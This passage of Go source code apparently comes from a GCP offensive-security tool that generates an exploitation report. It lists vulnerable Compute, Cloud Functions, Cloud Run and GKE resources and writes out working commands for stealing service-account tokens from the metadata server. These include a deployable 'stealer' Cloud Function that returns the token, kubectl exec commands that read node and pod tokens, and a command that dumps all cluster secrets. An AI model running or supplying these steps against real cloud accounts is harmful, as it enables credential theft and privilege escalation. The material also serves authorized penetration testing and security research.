		sections.WriteString("# Steal SA token from metadata server\n")
		sections.WriteString("curl -s -H 'Metadata-Flavor: Google' \\\n")
		sections.WriteString("    'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'\n\n")
		sections.WriteString("# Get SA email\n")
		sections.WriteString("curl -s -H 'Metadata-Flavor: Google' \\\n")
		sections.WriteString("    'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email'\n\n")
		sections.WriteString("# Use token with curl\n")
		sections.WriteString("TOKEN=$(curl -s -H 'Metadata-Flavor: Google' \\\n")
		sections.WriteString("    'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' | jq -r .access_token)\n")
		sections.WriteString("curl -H \"Authorization: Bearer $TOKEN\" \\\n")
		sections.WriteString("    'https://www.googleapis.com/compute/v1/projects/PROJECT/zones/ZONE/instances'\n")
		sections.WriteString("```\n\n")
	}

	// Cloud Functions Token Theft
	if len(categories["Cloud Function Token Theft"]) > 0 {
		sections.WriteString("## Cloud Functions Token Theft\n\n")
		sections.WriteString("These Cloud Functions have attached service accounts. Deploy a malicious function to steal tokens.\n\n")
		sections.WriteString("### Vulnerable Functions:\n")
		for _, path := range categories["Cloud Function Token Theft"] {
			sections.WriteString(fmt.Sprintf("- %s (SA: %s) in %s\n", path.Principal, path.TargetResource, path.ProjectID))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Create token stealer function\n")
		sections.WriteString("mkdir /tmp/fn-stealer && cd /tmp/fn-stealer\n\n")
		sections.WriteString("cat > main.py << 'EOF'\n")
		sections.WriteString("import functions_framework\n")
		sections.WriteString("import requests\n\n")
		sections.WriteString("@functions_framework.http\n")
		sections.WriteString("def steal(request):\n")
		sections.WriteString("    r = requests.get(\n")
		sections.WriteString("        'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',\n")
		sections.WriteString("        headers={'Metadata-Flavor': 'Google'})\n")
		sections.WriteString("    return r.json()\n")
		sections.WriteString("EOF\n\n")
		sections.WriteString("echo 'functions-framework\\nrequests' > requirements.txt\n\n")
		sections.WriteString("# Deploy with target SA (requires cloudfunctions.functions.create + iam.serviceAccounts.actAs)\n")
		sections.WriteString("gcloud functions deploy stealer --gen2 --runtime=python311 \\\n")
		sections.WriteString("    --trigger-http --allow-unauthenticated \\\n")
		sections.WriteString("    --service-account=TARGET_SA@PROJECT.iam.gserviceaccount.com\n\n")
		sections.WriteString("# Invoke to get token\n")
		sections.WriteString("curl $(gcloud functions describe stealer --format='value(url)')\n")
		sections.WriteString("```\n\n")
	}

	// Cloud Run Token Theft
	if len(categories["Cloud Run Token Theft"]) > 0 {
		sections.WriteString("## Cloud Run Token Theft\n\n")
		sections.WriteString("These Cloud Run services have attached service accounts.\n\n")
		sections.WriteString("### Vulnerable Services:\n")
		for _, path := range categories["Cloud Run Token Theft"] {
			sections.WriteString(fmt.Sprintf("- %s (SA: %s) in %s\n", path.Principal, path.TargetResource, path.ProjectID))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Deploy Cloud Run service with target SA\n")
		sections.WriteString("# (requires run.services.create + iam.serviceAccounts.actAs)\n")
		sections.WriteString("gcloud run deploy stealer --image=gcr.io/PROJECT/stealer \\\n")
		sections.WriteString("    --service-account=TARGET_SA@PROJECT.iam.gserviceaccount.com \\\n")
		sections.WriteString("    --allow-unauthenticated\n\n")
		sections.WriteString("# Container code fetches token from metadata server same as compute\n")
		sections.WriteString("```\n\n")
	}

	// GKE Cluster Token Theft
	if len(categories["GKE Cluster Token Theft"]) > 0 || len(categories["GKE Node Pool Token Theft"]) > 0 {
		sections.WriteString("## GKE Cluster Token Theft\n\n")
		sections.WriteString("These GKE clusters have node service accounts that can be accessed from pods.\n\n")
		sections.WriteString("### Vulnerable Clusters:\n")
		for _, path := range categories["GKE Cluster Token Theft"] {
			sections.WriteString(fmt.Sprintf("- %s (SA: %s) in %s\n", path.Principal, path.TargetResource, path.ProjectID))
		}
		for _, path := range categories["GKE Node Pool Token Theft"] {
			sections.WriteString(fmt.Sprintf("- %s (SA: %s) in %s\n", path.Principal, path.TargetResource, path.ProjectID))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Get cluster credentials\n")
		sections.WriteString("gcloud container clusters get-credentials CLUSTER --zone=ZONE --project=PROJECT\n\n")
		sections.WriteString("# If Workload Identity is NOT enabled, steal node SA token from any pod:\n")
		sections.WriteString("kubectl exec -it POD -- curl -s -H 'Metadata-Flavor: Google' \\\n")
		sections.WriteString("    'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'\n\n")
		sections.WriteString("# If Workload Identity IS enabled, check for pod SA token:\n")
		sections.WriteString("kubectl exec -it POD -- cat /var/run/secrets/kubernetes.io/serviceaccount/token\n\n")
		sections.WriteString("# List secrets for credentials\n")
		sections.WriteString("kubectl get secrets -A -o yaml\n")
		sections.WriteString("```\n\n")
	}

	return sections.String()
}
